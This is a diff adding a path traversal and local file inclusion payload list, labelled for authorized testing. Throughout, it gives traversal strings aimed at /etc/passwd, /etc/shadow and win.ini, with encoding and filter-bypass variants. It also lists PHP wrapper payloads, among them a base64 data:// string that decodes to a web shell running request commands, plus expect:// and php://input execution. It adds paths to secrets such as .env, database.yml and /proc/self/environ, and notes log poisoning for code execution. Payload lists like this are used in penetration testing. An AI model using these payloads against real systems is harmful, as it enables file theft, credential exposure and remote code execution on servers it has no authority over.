@@ -1,0 +1,46 @@
+# Path Traversal / LFI — canonical payloads (authorized testing)
+# Full sets: ../vendor/PayloadsAllTheThings/Directory Traversal/ , File Inclusion/
+# Goal: read files outside the web directory. Marker: /etc/passwd , win.ini
+
+## --- Basic (Linux) ---
+../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../etc/passwd%00
+/etc/passwd
+....//....//....//etc/passwd
+
+## --- Windows ---
+..\..\..\..\windows\win.ini
+../../../../windows/win.ini
+..\..\..\..\boot.ini
+C:\windows\system32\drivers\etc\hosts
+
+## --- Encoding (filter bypass) ---
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd            # double-encode
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd              # overlong UTF-8
+..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini
+
+## --- Filter bypass (stripping ../) ---
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+
+## --- PHP wrappers (LFI → RCE) ---
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+expect://id
+php://input                                    # + POST body z kodem PHP
+
+## --- Known sensitive paths ---
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log                    # log poisoning → RCE
+../../../../../../../../var/www/html/config.php
+../../.env
+../../../app/config/database.yml
